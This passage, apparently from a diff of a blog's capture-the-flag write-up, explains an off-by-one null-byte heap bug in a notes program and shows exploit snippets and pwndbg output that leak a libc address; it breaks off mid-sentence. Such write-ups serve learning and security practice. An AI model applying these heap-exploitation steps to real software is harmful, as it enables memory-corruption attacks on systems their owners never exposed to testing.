+  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_2</span> <span class="o">+</span> <span class="n">param_1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now we seem to have a problem. The <code class="language-plaintext highlighter-rouge">string_terminator</code> function puts a nullbyte at <code class="language-plaintext highlighter-rouge">notes[i]-&gt;data + notes[i]-&gt;size</code>. But that’s one byte too much. Let’s say we do this:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Right before string_terminator is called, the heap looks like this:</p>
+
+<p>So <code class="language-plaintext highlighter-rouge">data + size = 0xe7f030+0x108</code>. Let’s do that in gdb:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0xe7f030</span><span class="o">+</span><span class="mh">0x108</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mh">0xe7f138</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">xb</span> <span class="mh">0xe7f138</span>
+<span class="mh">0xe7f138</span><span class="o">:</span>       <span class="mh">0x21</span>
+</code></pre></div></div>
+<p>So, by writing a null byte at <code class="language-plaintext highlighter-rouge">0xe7f138</code>, we overwrite the next chunks size LSB with a null byte. So this is a off-by-one nullbyte challenge.</p>
+
+<h1 id="libc-leak">LIBC LEAK</h1>
+
+<p>The first thing we need, is a libc leak. To get a libc pointer, we need to place a chunk into the unsorted bin. We allocate 2 chunks, when of them being unsorted bin sized and then we free them:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x108</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The program will do this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span>    <span class="err">#</span><span class="mi">1</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="o">-</span> <span class="n">A</span> <span class="err">#</span><span class="mi">2</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span>    <span class="err">#</span><span class="mi">3</span>
+<span class="n">malloc</span><span class="p">(</span><span class="mh">0x108</span><span class="p">)</span> <span class="o">-</span> <span class="n">B</span> <span class="err">#</span><span class="mi">4</span>
+<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">4</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">it</span> <span class="n">consolidates</span> <span class="n">with</span> <span class="n">the</span> <span class="n">top</span> <span class="n">chunk</span>
+<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">3</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">goes</span> <span class="n">to</span> <span class="n">fastbin</span>
+<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">2</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">unsorted</span> <span class="n">bin</span> <span class="p">(</span><span class="n">it</span> <span class="n">won</span><span class="err">'</span><span class="n">t</span> <span class="n">consolidate</span> <span class="n">because</span> <span class="n">of</span> <span class="err">#</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="err">#</span><span class="mi">1</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">goes</span> <span class="n">to</span> <span class="n">fastbin</span>
+</code></pre></div></div>
+<p>and the bins will look like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastbins
+0x20: 0xb90000 —▸ 0xb90130 ◂— 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0xb90020 —▸ 0x7fe53fc97b78 (main_arena+88) ◂— 0xb90020 /* ' ' */
+smallbins
+empty
+largebins
+empty
+</code></pre></div></div>
+
+<p>Now the notes[] array is empty, so we can’t dump the first note and get the pointers. So we allocate a chunk to read the pointer, and we get the leak.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="sa">b</span><span class="s">"C"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">_</span><span class="p">,</span> <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3c4c78</span>
+
+<span class="n">info</span><span class="p">(</span><span class="s">"libc_leak @ "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"libc_base @ "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><img src="" alt="diary2_heap2" /></p>
+
+<p>We want the use the off by one, but the 0x10 chunk allocated before each desired chunk stands in our way, so we need to find a way to bypass this. We allocate 3 0x10 sized chunks, and we free them. This way, we put 6(3 data chunks + 3 notes(pointer to data and size)) chunks in the 0x20 fastbin, so for the next 6 mallocs, the 0x10 chunks will be from the fastbin.</p>
+
+<p>Afte</p>
 
 </div>
 
